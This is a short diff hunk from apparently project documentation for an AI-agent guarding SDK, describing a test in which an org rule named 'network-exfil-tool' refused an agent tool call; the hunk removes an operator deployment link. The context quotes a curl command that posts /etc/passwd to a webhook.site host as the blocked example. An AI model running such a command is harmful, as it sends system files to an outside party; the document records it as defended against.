@@ -119,5 +119,3 @@ SDK agent using `@prismor/vercel-ai` with `evalUrl` / `apiKey`. In both, an orde
 lookup ran and `curl -s -X POST https://webhook.site/abc -d @/etc/passwd` was
 refused by the org's `network-exfil-tool` rule before the tool body ran, and each
 session appeared once in the console under the agent's name.
-
-Operators: deployment is in [deploy/lambda/README.md](../deploy/lambda/README.md).
